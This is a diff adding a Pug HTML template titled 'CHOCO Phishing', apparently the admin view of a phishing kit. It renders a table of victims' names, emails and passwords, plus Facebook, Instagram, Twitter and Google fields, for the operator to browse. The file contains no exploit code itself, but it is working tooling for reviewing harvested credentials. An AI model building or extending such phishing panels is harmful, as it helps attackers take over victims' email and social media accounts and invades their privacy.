@@ -1,0 +1,34 @@
+doctype html
+html
+  head
+    title CHOCO Phishing
+    meta(charset='utf-8')
+    link(rel='stylesheet' href='vendor/bootstrap/dist/css/bootstrap.min.css')
+    script(src='vendor/jquery/dist/jquery.min.js')
+    script(src='vendor/bootstrap/dist/js/bootstrap.min.js')
+  body
+    .navbar.navbar-light.bg-faded
+      a.navbar-brand(href='./') CHOCO
+    .container
+      table.table(style='margin-top: 20px;')
+        thead
+          tr
+            th #
+            th Name
+            th Email
+            th Password
+            th Facebook
+            th Instagram
+            th Twitter
+            th Google
+        tbody
+        each user, i in users
+          tr
+            th(scope='row')= i
+            td= user.names
+            td= user.email
+            td= user.pass
+            td= user.facebook
+            td= user.instagram
+            td= user.twitter
+            td= user.google
